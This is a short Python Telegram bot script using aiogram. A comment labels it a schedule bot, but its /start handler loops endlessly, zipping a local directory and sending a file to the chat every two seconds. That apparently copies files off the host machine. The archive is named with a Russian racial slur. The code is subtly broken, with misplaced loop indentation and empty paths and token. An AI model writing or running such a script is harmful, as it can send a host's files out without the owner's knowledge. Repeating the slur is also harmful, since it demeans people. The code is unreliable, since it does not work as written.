import aiogram
import zipfile
import os
import logging
import time
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup

bot = Bot(token = '')#Токен бота с расписанием
dp = Dispatcher(bot)
memstore = MemoryStorage()
logging.basicConfig(level=logging.INFO)

@dp.message_handler(commands="start")
async def cmd_test1(message: types.Message):
    while True:
        zf = zipfile.ZipFile("негр.zip", "w")
        for dirname, subdirs, files in os.walk(r""):
            zf.write(dirname)
        for filename in files:
            zf.write(os.path.join(dirname, filename))
        zf.close()
        time.sleep(2)
        await message.reply_document(open(r'', 'rb'))


if __name__ =='__main__':
    executor.start_polling(dp, skip_updates=True)

